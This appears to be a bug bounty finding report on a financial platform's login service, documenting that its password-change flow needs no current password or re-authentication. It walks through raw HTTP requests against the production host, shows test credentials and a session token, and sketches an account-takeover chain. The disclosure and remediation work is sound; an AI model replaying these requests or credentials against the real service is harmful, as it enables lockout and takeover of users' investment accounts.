# F024 - Password Change Without Current Password or Re-authentication

## Summary

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS 3.1 | 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | POST https://investor-auth.spiko.io/self-service/settings?flow={id} |
| Status | Confirmed |

## Description

The Ory Kratos settings flow allows a user to change their password by submitting only the new password via the "password" method. The current password is not required, and no re-authentication step is enforced. Any holder of a valid session token can immediately change the account password.

Combined with the CAPTCHA bypass (F18) and session-before-email-verification (F19), an attacker chain becomes:
1. Register with a victim's email (CAPTCHA bypass, no real validation)
2. Receive an active session immediately (F19)
3. Change the password to lock the victim out (this finding)

Combined with any session theft vector (XSS, session fixation, cookie scope issues F03/F14), an attacker with a stolen session can immediately change the password without knowing the original password, locking out the legitimate user.

## Proof

### Step 1: Login and obtain session token

```
POST /self-service/login?flow=d9f1d7c7-0ef3-4120-89f2-a43e55118180 HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"password","identifier":"peter.bjorn75+spiko-prod1@gmail.com","password":"SpikoBugBounty2026!#","transient_payload":{"captcha_token":"x"}}
```

Response: HTTP 200, session_token returned.

### Step 2: Get settings flow

```
GET /self-service/settings/api HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_EAdNx3FpCf1Yc82LceMISL74eEXAh4L1
```

Response: HTTP 200, flow ID returned. The password field does NOT show any "current_password" field.

### Step 3: Change password (no current password required)

```
POST /self-service/settings?flow=869c6259-62a2-4a87-8606-0da04b493f15 HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_EAdNx3FpCf1Yc82LceMISL74eEXAh4L1
Content-Type: application/json

{"method":"password","password":"NewTestPassword2026!#"}
```

```
HTTP/2 200
{"state":"success","ui":{"messages":[{"id":1060001,"text":"Your changes have been saved!","type":"info"}]}}
```

### Step 4: Verify password change

Login with new password: HTTP 200 (success)
Login with old password: HTTP 400 (rejected - "The provided credentials are invalid")

## Impact

An attacker who obtains a valid session token through any means (XSS, session fixation, cookie theft via staging hosts, physical access to a logged-in device) can immediately and irreversibly change the account password without knowing the original password. The legitimate user is locked out. On a financial platform managing investment accounts, this enables full account takeover.

## Remediation

1. Require the current password when setting a new password via the settings flow
2. Configure Ory Kratos to enforce `required_aal` for the password method in the settings flow
3. Consider requiring a re-authentication step (fresh login within last N minutes) for sensitive operations
